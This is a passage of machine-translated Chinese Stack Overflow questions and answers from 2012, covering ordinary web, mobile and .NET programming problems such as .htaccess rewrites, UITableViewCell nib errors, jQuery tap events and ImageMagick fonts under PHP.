protected void onResume() {
    super.onResume();
    mSensorManager.registerListener(this,
            mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER),
            SensorManager.SENSOR_DELAY_NORMAL);
}

@Override
protected void onPause() {
    super.onPause();
    mSensorManager.unregisterListener(this);
} 
```

# .htaccess - .htaccess mod_rewrite 类别的重写规则

> ID：12215084
> 
> 赞同：1
> 
> 时间：2012-08-31T12:09:15.037
> 
> 标签：.htaccess, mod-rewrite

我想要[http://www.mywebsite.com/cd2012/legal](http://www.mywebsite.com/cd2012/legal)而不是[http://www.mywebsite.com/cd2012/index.php?legal=1](http://www.mywebsite.com/cd2012/index.php?legal=1)

我试过了

```
Options +FollowSymLinks
RewriteEngine on
RewriteRule guarantees/(.*) cd2012/index\.php/legal=$1 [R=301,L]
RewriteRule guarantees cd2012/index\.php/legal=$1 [R=301,L]
RewriteRule ^guarantees/$ cd2012/index\.php/legal=$1 [R=301,L] 
```

他们都没有工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:12:34.097

如果你想重写，你不想使用`[R=301,L]`，因为这基本上意味着“告诉用户浏览器这个文档被永久移动到这个位置”

您也不应该逃避最终路径，因为它不是正则表达式。

相反，这样做（根据你的例子）：

```
RewriteEngine on
RewriteRule ^cd2012/?$ cd2012/index.php
RewriteRule ^cd2012/(.*) cd2012/index.php?$1=1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-11T21:05:44.023

```
<IfModule mod_rewrite.c>
   RewriteEngine On
   RewriteRule ^([a-zA-Z0-9]+)/$ index.php?$1=1 [L]
   RewriteRule ^([a-zA-Z0-9]+)$ index.php?$1=1 [L]
</IfModule> 
```

现在，这就是我的魔力。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:28:00.817

试试这个 ：

```
RewriteEngine on
RewriteBase /
RewriteRule ^cd2012/legal$ cd2012/index.php?legal=1 [L] 
```

# iphone - UITableViewCell 错误 - 此类与键的键值编码不兼容

> ID：12215086
> 
> 赞同：8
> 
> 时间：2012-08-31T12:09:19.590
> 
> 标签：iphone, objective-c, ios, cocoa-touch, cocoa-bindings

当我尝试通过 UINib 的 instantiateWithOwner 方法从 xib 文件加载自定义 UITableViewCell 时，出现以下错误。我已经尝试了在这里可以找到的所有其他解决方案，但都没有运气。问题似乎是当 UINib 打开 xib 文件时，它使用超类 UITableViewCell 而不是我的自定义类 ContentPackCell。我附上了一个来自 Interface Builder 的屏幕截图，显示了我将 xib 与我的类关联的位置以及关联标识符的位置。必须有一些其他的步骤，我错过了。

错误：

`*** Terminating app due to uncaught exception 'NSUnknownKeyException', reason: '[<UITableViewCell 0x6b87220> setValue:forUndefinedKey:]: this class is not key value coding-compliant for the key descriptionLabel.'`

代码（类似于 Apple 的示例 AdvancedTableViewCells 项目）：

```
ContentPackCell *cell = (ContentPackCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
    [self.cellNib instantiateWithOwner:self options:nil];
    cell = tmpCell;
    self.tmpCell = nil;
} 
```

![在 IB 中设置自定义类](../Images/920e2b24ee49f3345d44b061dafc763e.png)

![在 IB 中设置标识符](../Images/9fac0e70c790a2f4c739d681c1f15676.png)

* * *

更新：

![设置文件所有者的类](../Images/e14d9385d3a06fa4450ad6ba9d8521e1.png)

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-11-09T00:20:49.333

确保 nib 中的 File's Owner 设置为 NSObject，并确保没有连接到 File's Owner 的插座。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-31T12:33:40.967

检查笔尖中的所有元素，确保它们没有引用不再存在的东西。右键单击它们以查看指向什么。里面肯定会有东西。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T12:14:21.267

看起来您已将 nib 中的 UILabel 与代码中不再存在的 IBOutlet 链接（descriptionLabel）。

所以再次检查你的 nib 文件。我也多次遇到此错误，这就是我的解决方案。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-26T10:16:21.270

在我的情况下，问题是通过检查可编译源列表中是否存在 .m 来解决的。

如果您为自定义表格单元格（或 Interface Builder 所需的任何其他内容）重命名、移动或添加新源，您应该将它们添加到 Project -> Targets -> -> Build Phases -> Compile Sources。

如果您有多个目标 - 检查所有目标。在我的项目中，有一个聚合类型的活动目标（使用自定义 IPA 构建脚本），我认为这是问题的根源，因为新添加的 *.m 文件错过了应用程序类型目标的编译源列表。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-30T09:48:11.090

我遇到了完全相同的错误，并且想知道为什么当我右键单击左侧“对象”中的表格单元格时，我的 .h 文件中的 IBOutlets 没有显示，而只是在文件的所有者处显示。我发现当我在 xib 文件的“视图”中左键单击自定义表格单元格，然后在属性检查器中将其分配给“标识符”处的正确自定义 (tableViewCell) 类时，出口出现在表格单元格中在“对象”。也许这有帮助！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-03T14:23:15.163

你有没有试过这样

```
ContentPackCell *cell = (ContentPackCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
  [self.cellNib instantiateWithOwner:nil options:nil]; //Make owner nil
  cell = tmpCell;
  self.tmpCell = nil;
} 
```

通常当你这样做时，你`[[NSBundle mainBundle] loadNibNamed:@"ContentPackCell" owner:nil options:nil];`会得到像现在这样的错误。因此，如果您收到“此类不符合键值编码”之类的错误，在这两种情况下，原因是没有为自定义单元格的“文件所有者”设置类。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-31T12:53:10.093

```
static NSString *CellIdentifier = @"CellIdentifierName";
ContentPackCell *cell = (ContentPackCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

if (cell == nil) {
    [[NSBundle mainBundle] loadNibNamed:@"ContentPackCell" owner:self options:nil] ;
    cell=objCustomCell;
} 
```

# android - 希望选项返回在设备或模拟器中运行应用程序之间进行选择

> ID：12215088
> 
> 赞同：2
> 
> 时间：2012-08-31T12:09:35.440
> 
> 标签：android, eclipse

我正在使用 Eclipse 学习 Android 编程。我曾经在我的移动设备或模拟器中运行我的应用程序，它通常会弹出一个窗口，我可以在其中选择要运行的设备，最后一次检查了始终运行此设备的选项，所以现在我只能在其中运行它我的移动设备！我只是想知道如何返回窗口以取消选中此选项以便能够再次在它们之间进行选择？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:17:11.250

转到`eclipse` `Run Configurations`选择您的应用程序，然后在`Target`选项卡的右侧选择`Always prompt to pick device`单选按钮。

# jquery - 在 Twitter Bootstrap 中使用点击事件

> ID：12215096
> 
> 赞同：6
> 
> 时间：2012-08-31T12:09:57.230
> 
> 标签：jquery, events, jquery-mobile, twitter-bootstrap, touch

我正在使用 twitter-bootstrap 开发一个可以在多个设备上呈现的 Web 应用程序。

现在我想处理“点击”事件。所以我的问题是：

1.  我可以在不使用 jqueryMobile 的情况下使用 jquery 1.7.2 处理“点击”事件吗？
2.  如果上述问题的答案是否定的，那么如何将 jqueryMobile 与 twitter-bootstrap 集成。因为我尝试在我的 twitter-bootstrap 页面中包含 jQueryMobile js，当我使用它时，页面中断了！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T15:46:35.137

**点击**事件是一个 jQuery Mobile 事件，并不是一个具有规范的实际 HTML5 事件。[HTML5 指定了**触摸**事件，](http://www.w3.org/TR/touch-events/) [Android 和 iOS](http://caniuse.com/#search=touch)都支持这些事件，Twitter Bootstrap 已经在它的一些插件中使用了这些事件。

然而，根据一个常识概念，**点击**事件可能是什么，人们可以很容易地根据一系列触摸事件触发它们。这是一个尝试：

```
// listen for a touchstart event
$('body').on('touchstart.tap',function (e) {

  // listen for a touchend event
  $(e.target).one('touchend.tap',function() {
    $(e.target).trigger('tap');
  });

  // cancel it in 150ms
  setTimeout(function () {
    $(e.target).off('touchend.tap');
  },150);
}); 
```

**如果一个touchend**在 150 毫秒内跟随一个**touchstart**（当然你可以调整），这将触发一个**点击**事件。**如果您只需要点击**事件，您可以尝试使用它来代替包含 jQuery mobile 。

 ******* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-13T11:54:48.980

我终于找到了处理触摸及其相应鼠标事件[的 Touchable-jQuery-Plugin 。](https://github.com/dotmaster/Touchable-jQuery-Plugin)******

# matlab - MOSEK的quadprog比matlab慢

> ID：12215098
> 
> 赞同：1
> 
> 时间：2012-08-31T12:10:06.543
> 
> 标签：matlab, mosek, quadprog

我正在使用 MOSEK 的 quadprog。当我运行它时，我得到以下输出，然后我看不到任何进展（等了 10 分钟）：

```
Setting int param MSK_IPAR_LOG_INTPNT to 1
Setting int param MSK_IPAR_LOG_SIM to 1
Setting int param MSK_IPAR_LOG_BI to 1
Setting int param MSK_IPAR_LOG_PRESOLVE to 1
Setting int param MSK_IPAR_INTPNT_BASIS to 0

MOSEK Version 6.0.0.141 (Build date: 2012-7-27 07:08:39)
Copyright (c) 1998-2012 MOSEK ApS, Denmark. WWW: http://www.mosek.com

Computer   - Platform               : Windows/64-X86  
Computer   - CPU type               : Intel-P4        
MOSEK      - task name              :                 
MOSEK      - objective sense        : min             
MOSEK      - problem type           : QO (quadratic optimization problem)
MOSEK      - constraints            : 24216             variables              : 1944            
MOSEK      - integer variables      : 0               
Optimizer started.
Interior-point optimizer started.
Presolve started.
Linear dependency checker started.
Linear dependency checker terminated.
Eliminator - tries                  : 0                 time                   : 0.00            
Eliminator - elim's                 : 0               
Lin. dep.  - tries                  : 1                 time                   : 0.00            
Lin. dep.  - number                 : 0               
Presolve terminated. Time: 0.02    
Matrix reordering started.
Local matrix reordering started.
Local matrix reordering terminated.
Matrix reordering terminated.
Optimizer  - threads                : 1               
Optimizer  - solved problem         : the primal      
Optimizer  - constraints            : 24192             variables              : 26112           
Factor     - setup time             : 0.36              order time             : 0.31            
Factor     - GP order used          : yes               GP order time          : 0.27            
Factor     - nonzeros before factor : 398913            after factor           : 304889505       
Factor     - offending columns      : 0                 flops                  : 4.92e+012       
Factor     - GP saved nzs           : 8118              GP saved flops         : -8.47e+007      
ITE PFEAS    DFEAS    KAP/TAU  POBJ              DOBJ              MU       TIME  
0   1.9e+005 3.1e+004 1.0e+000 5.340410914e+002  5.340410914e+002  1.0e+003 0.44 
```

Matlab 的 quadprog 解决问题的速度要快得多。对此我能做些什么吗？

# javascript - 在 IE9 中触发输入文件点击

> ID：12215100
> 
> 赞同：3
> 
> 时间：2012-08-31T12:10:15.970
> 
> 标签：javascript, jquery, html, internet-explorer-9

我似乎无法在 IE 中触发输入文件的点击事件，我不知道是什么问题

```
<input type="file" class="ruFileInput" />
<button id="clickMe" value="ClickMe" ></button>

<script type="text/javascript">
   $(document).ready(function(){
      $("#clickMe").click(function(){
         $('input[type=file]').trigger('click');
      });
   }); 
```

它在 firfox 和 chrome 上运行良好，但在 IE9 中却不行

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:15:43.483

将右引号添加到第一个输入的类中，并在按钮中添加一些文本以正确显示

这是一个有效的[小提琴](http://jsfiddle.net/awRBK/)

还要确保您在 html 中也获取了 jquery 文件

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:24:00.770

刚刚测试了以下，它工作正常。您错过了 class="ruFileInput 末尾的关闭 "

我已经在 IE9 上测试过并且工作正常。

```
<html>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript"></script>
<script type="text/javascript">
    $(document).ready(function(){
        $("#clickMe").click(function(){
            $('input[type=file]').trigger('click');
        });
    });
</script>
</head>
<body>
   <input type="file" class="ruFileInput" />
   <button id="clickMe" value="ClickMe" ></button>
</body>
</html> 
```

# asp.net-mvc-3 - 如何在 MVC3 中显示数组？

> ID：12215103
> 
> 赞同：-2
> 
> 时间：2012-08-31T12:10:27.307
> 
> 标签：asp.net-mvc-3

您好朋友，我从 Web 服务获取数据，所以我不能使用 Html.DisplayFor(model=>model.item) 以及如何在数组中显示数据。这是我的代码：

```
@using icerik.TahakkukServices

@{
    ViewBag.Title = "Deneme";
    Layout = "~/Views/Shared/_Layout5.cshtml";
}

@{
    TahakkukServicesClient client = new TahakkukServicesClient();
    client.ClientCredentials.UserName.UserName = "service_test";
    client.ClientCredentials.UserName.Password = "";
    client.ClientCredentials.ServiceCertificate.Authentication.CertificateValidationMode = System.ServiceModel.Security.X509CertificateValidationMode.None;
    MakbuzList[] liste = client.GetMakbuzListe(2);

}

 @foreach (var item in liste)
 {

Html.DisplayFor(item.Adi)
                } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:26:20.197

@model icerik.TahakkukServices。添加您的表名

```
@{ 
    ViewBag.Title = "Deneme"; 
    Layout = "~/Views/Shared/_Layout5.cshtml"; 
} 

@{ 
    TahakkukServicesClient client = new TahakkukServicesClient(); 
    client.ClientCredentials.UserName.UserName = "service_test"; 
    client.ClientCredentials.UserName.Password = ""; 
    client.ClientCredentials.ServiceCertificate.Authentication.CertificateValidationMode = System.ServiceModel.Security.X509CertificateValidationMode.None; 
    MakbuzList[] liste = client.GetMakbuzListe(2); 

} 

 @foreach (var item in liste) 
 { 

Html.DisplayFor(model=>model.) add your column name
                } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:17:48.753

好的，我知道如何在您的服务中提供型号名称，如下所示

```
@model icerik.TahakkukServices.Borc 
```

所以你可以使用 Html.DisplayFor

# ruby-on-rails - Rails Ajax 助手如何工作

> ID：12215112
> 
> 赞同：0
> 
> 时间：2012-08-31T12:10:58.993
> 
> 标签：ruby-on-rails, ajax

在 Rails 3 中，假设我有以下代码：

**控制器**

```
...
format.js # create.js.erb
... 
```

**创建.js.erb**

```
$('#element').html("new content"); 
```

**查看表格**

```
...
button_to 'Create', element, remote: true 
```

我想知道文件中的 JS 是如何`create.js.erb`被调用的。我的猜测是它返回 JS 代码，并且一些 Rails 助手在收到它时调用它。这是正确的，还是这里有任何其他类型的魔法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:21:02.873

**编辑**

**简短回答**：基本上，您的假设是正确的，它将返回随后将执行的 JS 代码。

**稍微长一点的答案**：不过，它背后有一些魔力。单击该按钮时，它将向创建 url 发出 JSON 请求，但改为请求格式“js”。

然后，控制器知道预期的格式是“js”，并且在运行`create`操作之后，将呈现该格式的模板 -- `create.js.erb`。

`:remote => true`由于该选项，Rails 知道它应该执行此自定义 JSON 请求。它将`data-remote=true`属性添加到链接元素。

`rails.js`然后，在( [link](https://github.com/rails/jquery-ujs/blob/master/src/rails.js) ) 中指定的处理程序附加到具有此数据属性的每个元素，它负责其余的工作。

**原答案如下**

Rails 使用一种称为**Unobtrusive Javascript**的技术将您在 .js 文件上指定的处理程序附加到它们各自的事件。

[您可以在此](http://www.simonecarletti.com/blog/2010/06/unobtrusive-javascript-in-rails-3/)（更具体地说是第 3 部分）和[本文](http://www.simonecarletti.com/blog/2010/06/unobtrusive-javascript-technique/)中阅读有关它的更多信息。

**或者**，您可以采取最有趣的方式并查看`rails.js`文件以了解所有魔术是如何工作的 :)

# android - 在 android 中使用 GCM 实现 xtify 和使用 XMPP 实现 xtify 有什么区别？

> ID：12215113
> 
> 赞同：0
> 
> 时间：2012-08-31T12:10:59.667
> 
> 标签：android, xtify

如果我们在 android 中实现推送通知，那么在 android 中使用 GCM 实现 xtify 和使用 XMPP 实现 xtify 有什么区别？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-22T17:38:57.097

Xtify XMPP：

**优点：**

*   适用于 Android API 级别 5 或更高级别。
*   适用于不支持 C2DM/GCM 的设备，例如 kindle fire。

**缺点：**

*   在后台运行服务。
*   它仅受 Xtify 1.x API 支持。

Xtify C2DM/GCM：

**优点**

*   适用于 Android API 8 级或更高版本。
*   在新的 2.x Xtify API 中受支持。
*   它不运行自己的服务。

**缺点**

*   它仅适用于具有 Google play/Android 市场的设备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:16:07.083

如果您使用 api 级别 5 或更高级别，请使用 Xtify 和 GCM（Google Cloud Messaging）。基本上，Xtify 将使用 Google 的推送服务器来发送推送通知。如果您支持低于 api 级别 5，那么您将需要使用 XMPP，因为 GCM 不支持 sdks 低于 2.0 的设备。

# c# - 在 DLL 级别处理未处理异常的任何方式（Winforms 插件 DLL）

> ID：12215114
> 
> 赞同：3
> 
> 时间：2012-08-31T12:11:00.800
> 
> 标签：c#, winforms, exception-handling, event-handling

> **可能重复：**
> [如何在 C# 中的 dll 中进行全局异常处理？](https://stackoverflow.com/questions/8815074/how-to-have-a-global-exception-handling-in-dll-in-c)

我在 AppDomain 级别知道它，但由于我是框架中的 DLL 插件，所以我希望能够在我的 DLL 中的一个位置处理所有未处理的异常。

顺便说一句，如果没有这样的机制，那么解决方案是这样的：

**将 try-catch 放入每个事件处理程序的代码中（可能出现异常）**

我目前正在处理每个事件处理程序代码，有时当它被遗漏并且抛出未处理的异常时，它会破坏 UI 控件，并且除了重新启动应用程序之外很难恢复。

# salesforce - 更新自定义对象时更新多选项列表

> ID：12215116
> 
> 赞同：0
> 
> 时间：2012-08-31T12:11:16.337
> 
> 标签：salesforce, apex-code

我有自定义对象`KeywordAccountAssociation__c`。该对象具有三个字段

1.  `Account__c`- 主从（帐户）
2.  `Keyword__c`- 主从（关键字）
3.  `Compositecp__c`- 文本（255）（外部 ID）（区分大小写）

我在 Account 中有一个自定义字段

*   `DD_Segment__c`- 多选单

现在我想更新（插入也可以）更新`DD_Segment__c`时`KeywordAccountAssociation__c`的值。我可以为此编写触发器，但我不知道如何？我是 Salesforce 开发的新手，我的背景是红宝石（所以习惯 apex 对我来说有点困难）。

`KeywordAccountAssociation__c`有多行`Account__c`具有相同的 account_id 并且这些 account_id 与自定义对象的记录相关`Keyword__c`。我想获取与一个帐户相关的所有关键字并在其（帐户的）多选项列表中进行更新。我怎样才能做到这一点？如果您对此有疑问，请务必询问。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T14:11:34.843

一个问题与学习使用触发器有关，这可以从[触发器上的 Salesforce Apex 开发人员文档开始](http://www.salesforce.com/us/developer/docs/apexcode/index_Left.htm#CSHID=apex_triggers.htm%7CStartTopic=Content/apex_triggers.htm%7CSkinName=webhelp)

但要回答您的实际问题，您基本上需要针对您的自定义对象构建一个触发器，该触发器将更新相关帐户。它可能看起来像这样：

```
trigger keywordAccountUpdate on KeywordAccountAssociation__c (after insert, after update){
    set<id> = new set<id>();
    for (KeywordAccountAssociation__c a : Trigger.new)
        accountIds.put(a.Account__c);
    map<id,Account> accountMap = new map<id,Account>([select id, DD_Segment__c from Account where id in :accountIds]);
    for (KeywordAccountAssociation__c kaa : Trigger.new){
        if (AccountMap.containskey(kaa.Account__c)){
            Account thisAccount = AccountMap.get(kaa.Account__c);
            String s = thisAccount.DD_Segment__c + ';new value'; // Always add value
            if ((thisAccount.DD_Segment__c).contains('second value')
                s += ';second value';
            AccountsToUpdate.add(new Account(id=thisAccount.id, DD_Segment__c = s));
        }
    }
} 
```

请记住，我没有测试这个触发器的结构，我只是随意释放它，所以 YMMV。

# asp.net-mvc - Content 和 LoadContentFrom 的区别

> ID：12215117
> 
> 赞同：2
> 
> 时间：2012-08-31T12:11:20.073
> 
> 标签：asp.net-mvc, razor, kendo-ui

Kendo UI 的 Window contorl 的 Content 和 LoadContentFrom 属性有什么不同。我在主页上有两个按钮。每个按钮都有单独的窗口控件来调用相应的局部视图。如果我使用内容方法，则最初加载客户索引，即在页面加载时。如果我使用 LoadContentFrom，则在窗口可见时加载 DOM 控件。

例如，

```
@(Html.Kendo().Window()
    .Name("CustomerWindow")
    .Title("Customer")
    .Content(@<text>
@Html.Partial("../Customer/Index")
</text>)
    .Draggable()
    .Resizable()
    .Width(736)
    .Visible(false)
) 
```

和

```
@(Html.Kendo().Window()
    .Name("CustomerWindow")
    .Title("Customer")       
        .LoadContentFrom("../Customer/Index")
    .Draggable()
    .Resizable()
    .Width(736)
    .Visible(false)
    .Modal(true)
) 
```

我认为它的延迟加载概念，但我不知道确切的区别。

谢谢桑托什

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-03T19:41:27.400

该`LoadContentFrom`设置指定窗口将使用 Ajax 请求加载的 URL。`Content`定义窗口的静态 HTML 内容。

# richfaces - Richfaces 和 myfaces 兼容性问题

> ID：12215118
> 
> 赞同：1
> 
> 时间：2012-08-31T12:11:20.417
> 
> 标签：richfaces, openjpa, myfaces

我无法让 myFaces（2.1.8 但与 2.0 的概率相同）在 Tomee 1.1 容器上与 RichFaces 4.2.2 一起工作。尝试谷歌搜索，但没有发现任何相关内容。

将richfaces 标签添加到页面后，myFace JavaScript 库链接通常包含在页面的第一种形式中：

```
<script type="text/javascript" src="/pilot/javax.faces.resource/oamSubmit.js.xhtml?ln=org.apache.myfaces"> 
```

从呈现的 HTML 中消失。因此，所有“h:commandLink”链接在浏览器中都会失败，并出现 javascript 错误“myFaces not defined”。

这是一个样本

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml"
xmlns:h="http://java.sun.com/jsf/html"
xmlns:rich="http://richfaces.org/rich">

<h:head></h:head>
<h:body>

<h:form>
<h:commandLink value="Index" action="welcome" immediate="true" />
<rich:popupPanel >
</rich:popupPanel>
</h:form>

</h:body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T09:08:30.457

显然 Myfaces 是在 jsf.js 中定义的，并且存在一些问题。

无论如何在 web.xml 中添加以下代码可以解决问题

```
<context-param>
    <param-name>org.apache.myfaces.USE_MULTIPLE_JS_FILES_FOR_JSF_UNCOMPRESSED_JS</param-name>
    <param-value>true</param-value>
</context-param> 
```

# php - Imagemagick - 相同的命令在 PHP 或控制台中给出不同的输出

> ID：12215123
> 
> 赞同：1
> 
> 时间：2012-08-31T12:11:31.077
> 
> 标签：php, image, imagemagick, ubuntu-12.04

我正在尝试在 Ubuntu 12.04 服务器上使用 ImageMagick 来动态创建简单的名片。这是通过 php 页面完成的。我尝试安装 MagickWand，但它并没有真正起作用，所以我现在使用 ImageMagick 语法并通过 PHP 函数执行它`exec()`。

我取得了不错的进展，基本完成了或多或少，输出图像看起来还不错，现在正在微调，设置正确的位置，更改字体和大小等。

我们的图形人员希望文本是带有粗体标题的 Arial，所以我在服务器上安装了 msttcorefonts。从那时起，输出图像中的文本是斜体的，它忽略了我使用的任何字体。

奇怪的是：如果我将命令回显到页面，将其复制并粘贴到 ubuntu 控制台中，在那里创建的图像使用正确的字体，这正是我想要的。

因此，似乎当我通过控制台执行命令时，一切都很好，但是当我通过 PHP 在 PHP 中执行它时`exec()`，ImageMagick 似乎无法识别字体。有谁知道为什么？另外，如果它不识别字体，为什么它默认为斜体，或者，为什么在安装字体后默认值发生了变化？

这是我目前正在测试的命令（更改了名称和联系信息）：

```
 convert                                                     \
    -size 1051x697                                           \
     xc:none                                                 \
    -density 300                                             \
    -fill white                                              \
     draw "rectangle 0,0 1051,697"                           \
    -fill black                                              \
    -font Arial-Negreta                                      \
    -pointsize 9                                             \
    -draw "text 140,175 'Hotel Example'"                     \
    -font Arial-Normal                                       \
    -pointsize 6                                             \
    -draw "text 140,220 'Example Street 8'"                  \
    -draw "text 140,240 '12345 Exampletown'"                 \
    -draw "text 140,280 'Telefon: 123 45 67 89 0'"           \
    -draw "text 140,300 'Fax: 234 56 78 90'"                 \
    -draw "text 140,340 'http://www.example.de'"             \
    -draw "text 140,360 'hotel-example@example.de'"          \
    -stroke none -fill orange -draw "rectangle 1,32 1050,75" \
    -fill grey                                               \
    -draw "rectangle 1,75 1050,100"                          \
    -fill orange                                             \
    -draw "rectangle 1,626 1050,665"                         \
     test_front.png 
```

编辑：

我刚刚注意到从 Ubunut 控制台运行命令也只能在我的主目录中运行，而不是在我的 /var/www 目录中。正如 APiK 指出的那样，这可能是用户的事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:52:42.320

看起来您仅为特定用户安装了字体。尝试在控制台和 PHP 脚本中运行此命令：

```
# This will show you all the available fonts for ImageMagick
$ convert -list type 
```

或者你也可以直接指定TTF字体：

```
$ convert -font /path/to/your/fonts.ttf 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-01T00:54:06.600

我怀疑你的字体名称`Arial-Fett`并且`Arial-Standard`被 ImageMagick 识别。

要查看已知 Arial 字体的哪些名称，`convert`请先运行以下命令：

```
convert -list font | grep -i arial 
```

在我的系统（Mac OS Lion）上，我得到以下结果：

```
 [....]
  Font: Arial-Narrow-Negreta-cursiva
    family: Arial Narrow
    glyphs: /Library/Fonts/Arial Narrow Bold Italic.ttf
  Font: Arial-Narrow-Normal
    family: Arial Narrow
    glyphs: /Library/Fonts/Arial Narrow.ttf
  Font: Arial-Negreta
    family: Arial
    glyphs: /Library/Fonts/Arial Bold.ttf
  Font: Arial-Negreta-cursiva
    family: Arial
    glyphs: /Library/Fonts/Arial Bold Italic.ttf
  Font: Arial-Normal
    family: Arial
    glyphs: /Library/Fonts/Arial.ttf
  [....] 
```

使用 ImageMagick，您只能应用这两种方法来指定要使用的字体：

*   ...要么使用*标签*后出现的名称`Font:`，

*   ...或使用*出现*在标记后的特定字体文件的路径+名称`glyphs:`（如果文件名或路径使用空格，请将其括在引号中！）。

所以在我的系统上，为了你`-font Arial-Standard`我必须使用任何一个

```
-font Arial-Normal
-font /Library/Fonts/Arial.ttf 
```

而不是你的`-font Arial-Fett`我不得不使用任何一个

```
-font Arial-Negreta
-font "/Library/Fonts/Arial Bold.ttf" 
```

当然，在您的系统上，这可能会有所不同（尤其是在 Windows 或 Linux 上）。这就是为什么你必须验证使用`convert -list font`...

# jquery - 堆叠画布事件

> ID：12215128
> 
> 赞同：3
> 
> 时间：2012-08-31T12:11:43.377
> 
> 标签：jquery, html, canvas, mouseevent

我在另一个画布之上有一个透明背景的画布，并希望鼠标事件由它们上的元素注册。但是，上部画布阻止任何鼠标事件到达下部画布。最好的方法是什么？

```
 <div class="outer">
      <div class="inner" id="canvas_container_1"></div>  
      <div class="inner" id="canvas_container_2"></div>   
     </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:18:23.363

在两者上，你的意思是 2 内画布吗？

如果是 = 那么只需在您的“内部”类上添加一个事件侦听器：

`$('.outer').on('click','.inner',function() { ... })`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:27:56.577

您可以做的是模拟所有元素的触发器，如下所示：http: [//jsfiddle.net/AzNQb/](http://jsfiddle.net/AzNQb/)。

```
var handler = function(e) {
    // the actual handler
    console.log(e.pageX, this);
};

$(".inner").on("mousedown", function(e) {
    var args = arguments;
    var value;
    $(".inner").each(function() {
        // call handler for each element; preserve `return false` functionality
        if(handler.apply(this, args) === false) {
            value = false;
            return false;
        }
    });
    return value;
}); 
```

# ruby - Rails 3 和 Twitter 引导的侧边栏（附加） - 怎么样？

> ID：12215129
> 
> 赞同：0
> 
> 时间：2012-08-31T12:11:46.727
> 
> 标签：ruby, twitter-bootstrap, haml, ruby-on-rails-3.2, twitter-bootstrap-rails

我有带有 Twitter bootstrap 2.1.0 的简单 RoR 3.2 应用程序（我通过 twitter-bootstrap-rails gem 实现了它）。我想将侧边栏与几个链接集成（正如您在左侧的 twitter 引导页面上看到的那样），但我不知道如何实现这一点（是的，我是菜鸟）。有没有人有解决方案如何在 Rails 中做到这一点？

我的应用程序布局：

```
!!!
%html
  %head
    %title MyApp
    = stylesheet_link_tag    "application", :media => "all"
    = javascript_include_tag "application"
    = csrf_meta_tags
    %meta{ :name => "viewport", :content => "width=device-width, initial-scale=1.0"  }
  %body
    %div{ :class => "wrapper" }
      = render 'layouts/navbar_template'

      %div{ :class => "container-fluid" }
        - flash.each do |key, msg|
          %div{ :class => "alert alert-#{key}" }
            %button{ :type => "button", :class => "close", "data-dismiss" =>"alert" }×
            = msg
        %div{ :class => "row-fluid" }
          %div{:class => "span10"}
            =yield
          %div{:class => "span2"}
            -# I would like to have sidebar here 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T13:23:03.807

```
%ul.nav.nav-list.bs-docs-sidenav.affix
  %li.active
    %a{:href => "#dropdowns"}
      %i.icon-chevron-right
      Dropdowns
  %li
    %a{:href => "#buttonGroups"}
      %i.icon-chevron-right
      Button groups
  %li
    %a{:href => "#buttonDropdowns"}
      %i.icon-chevron-right
      Button dropdowns
  %li
    %a{:href => "#navs"}
      %i.icon-chevron-right
      Navs
  %li
    %a{:href => "#navbar"}
      %i.icon-chevron-right
      Navbar
  %li
    %a{:href => "#breadcrumbs"}
      %i.icon-chevron-right
      Breadcrumbs
  %li
    %a{:href => "#pagination"}
      %i.icon-chevron-right
      Pagination
  %li
    %a{:href => "#labels-badges"}
      %i.icon-chevron-right
      Labels and badges
  %li
    %a{:href => "#typography"}
      %i.icon-chevron-right
      Typography
  %li
    %a{:href => "#thumbnails"}
      %i.icon-chevron-right
      Thumbnails
  %li
    %a{:href => "#alerts"}
      %i.icon-chevron-right
      Alerts
  %li
    %a{:href => "#progress"}
      %i.icon-chevron-right
      Progress bars
  %li
    %a{:href => "#misc"}
      %i.icon-chevron-right
      Misc 
```

# c# - 使用 c# 代码创建 Windows 用户

> ID：12215131
> 
> 赞同：3
> 
> 时间：2012-08-31T12:11:49.970
> 
> 标签：c#, visual-studio

